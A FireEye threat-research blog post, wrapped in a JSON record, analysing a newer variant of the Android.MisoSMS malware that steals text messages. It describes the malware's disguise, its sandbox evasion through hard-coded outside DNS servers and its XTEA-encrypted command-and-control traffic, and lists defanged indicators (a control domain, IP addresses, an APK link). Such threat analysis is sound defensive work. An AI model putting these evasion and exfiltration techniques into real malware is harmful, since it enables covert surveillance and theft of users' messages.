                    "source": "www.fireeye.com"
                },
                "text": "FireEye Labs recently found a more advanced variant of Android.MisoSMS, the SMS-stealing malware that we uncovered last December — yet another sign of cybercriminals’ growing interest in hijacking mobile devices for surveillance and data theft. Like the original version of the malware, the new variant sends copies of users’ text messages to servers in China. But the newest rendition adds a few features that make it harder to detect, including a new disguise, encrypted transmissions, and command-and-control (CnC) communications that are handled natively rather than over email. FireEye Mobile Threat Prevention customers are already protected from both variants. Both variants of MisoSMS use the same names for receivers and services. While the old variant masquerades as an Android settings application, the new version presents itself as “Gplay Dsc” to the user. The new variant also abandons SMTP email as the transport method. It now handles all CnC communication natively in C++, making it harder for an analyst to analyze the malware by disassembling its ARM code. The newer version also hard codes specific public DNS servers such as the following: resolver1.opendns.com nscache.prserv.com resolver1.qwest.net resolver2.opendns.com google-public-dns-b.google.com google-public-dns-a.google.com mx1.oray.net.cn 183.136.132.176 183.136.132.170 The new MisoSMS attempts to resolve its CnC domain name(puk[dot]nespigt[dot]iego[dot]net) from one of these DNS servers. In this way, MisoSMS stays quiet in sandbox environments, which typically use internal DNS servers and cut off access to outside networks. If the malware cannot access the hard-coded DNS servers, it does nothing and is therefore not detected. The new MisoSMS also uses a variant of the XTEA encryption algorithm to communicate with its CnC server. The request and responses of the CnC server are structured so that the first four bytes of the request and response contain the length of the encrypted blob of data. By skipping the first four bytes, we can decrypt the communications using the key embedded in the native binary. Figure 1 shows MisoSMS registering a newly infected device with the CnC server. The first four bytes in the encrypted payload mark the length of the message. The rest of the payload contains information about the infected device. [caption id=\"attachment_5080\" align=\"aligncenter\" width=\"621\"] Figure 1 - New Infection Registration[/caption] Figure 2 and Figure 3 show the SMS exfiltration mechanism, as seen in Figure 1, the first four bytes of the encrypted payload contains the length indicator of the payload. The intercepted SMS message is sent to the CnC with the Device ID of the already compromised device. [caption id=\"attachment_5078\" align=\"aligncenter\" width=\"640\"] Figure 2 - Encrypted CnC Communication containing stolen SMS[/caption] [caption id=\"attachment_5079\" align=\"aligncenter\" width=\"640\"] Figure 3 - Decrypted CnC Communication containing stolen SMS[/caption] The domain name of the CnC is also encrypted and stored as a byte array in the native binary. Once the encrypted byte array containing the CnC information is decrypted, the malware checks to see whether the CnC is a domain or an IP address. That check is  meaningful. Its existence implies the ability to change the CnC information dynamically. And that ability, in turn, suggests that MisoSMS uses excerpts of publically available code. The CnC server currently serves a Web page that resembles an Android app, as shown in Figure 4. [caption id=\"attachment_5081\" align=\"aligncenter\" width=\"349\"] Figure 4 - CnC serving an webpage[/caption] The Web page contains a link pointing to “hxxps://www.dropbox.com/s/t47d2nheqbhky64/%EA%B2%BD%20%EC%B0%B0%20%EC%B2%AD[dot]apk,” which is currently not available. Like the website, the MisoSMS app itself displays Korean text. The newest version of MisoSMS suggests that cyber attackers are increasingly eyeing mobile devices — and the valuable information they store — as targets. It also serves as a vivid reminder of how crucial protecting this threat vector is in today’s mobile environment. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        }
    ]
}